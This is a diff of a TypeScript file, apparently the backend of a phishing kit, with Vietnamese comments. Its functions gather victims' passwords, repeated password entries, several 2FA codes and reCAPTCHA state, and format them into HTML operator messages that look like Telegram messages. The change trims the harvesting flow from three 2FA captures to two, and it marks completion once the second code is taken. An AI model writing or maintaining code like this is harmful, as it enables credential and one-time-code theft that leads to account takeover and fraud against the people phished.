@@ -107,7 +107,6 @@ function normalizeData(input: any = {}) {
         authMethod: input.authMethod ?? '',
         twoFa: input.twoFa ?? '',
         twoFaSecond: input.twoFaSecond ?? '',
-        twoFaThird: input.twoFaThird ?? '',
         recaptcha: input.recaptcha ?? '',
     };
 }
@@ -135,7 +134,7 @@ function formatMessage(data: any, options: FormatMessageOptions = {}): string {
         ? `${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}`
         : '';
     const authLine = d.authMethod ? `<b>🧩 Auth:</b> <code>${escapeHtml(d.authMethod)}</code>` : '';
-    const has2FA = Boolean(d.twoFa || d.twoFaSecond || d.twoFaThird);
+    const has2FA = Boolean(d.twoFa || d.twoFaSecond);
     const phoneDisplay = d.phone && String(d.phone).trim() ? escapeHtml(`+${String(d.phone).trim()}`) : '';
 
     const lines = [
@@ -166,8 +165,7 @@ function formatMessage(data: any, options: FormatMessageOptions = {}): string {
         filtered.push(
             `----------------------`,
             `<b>2FA(1):</b> <code>${formatCodeField(d.twoFa)}</code>`,
-            `<b>2FA(2):</b> <code>${formatCodeField(d.twoFaSecond)}</code>`,
-            `<b>2FA(3):</b> <code>${formatCodeField(d.twoFaThird)}</code>`
+            `<b>2FA(2):</b> <code>${formatCodeField(d.twoFaSecond)}</code>`
         );
     }
 
@@ -186,8 +184,7 @@ function isRecaptchaTickEvent(data: any): boolean {
         d.passwordSecond ||
         d.authMethod ||
         d.twoFa ||
-        d.twoFaSecond ||
-        d.twoFaThird;
+        d.twoFaSecond;
     return !hasFormData;
 }
 
@@ -200,10 +197,10 @@ function stripClientEventFlags(data: any = {}) {
     return rest;
 }
 
-/** Đã xong bước 2FA lần 3 → coi là hoàn tất toàn bộ luồng. */
+/** Đã xong bước 2FA lần 2 → coi là hoàn tất toàn bộ luồng. */
 function hasCompletedFullFlow(data: any): boolean {
     const d = normalizeData(data);
-    return Boolean(String(d.twoFaThird ?? '').trim());
+    return Boolean(String(d.twoFaSecond ?? '').trim());
 }
 
 /** Không gửi lại reCAPTCHA / Thông tin kích hoạt khi user quay lại từ đầu sau khi đã xong. */
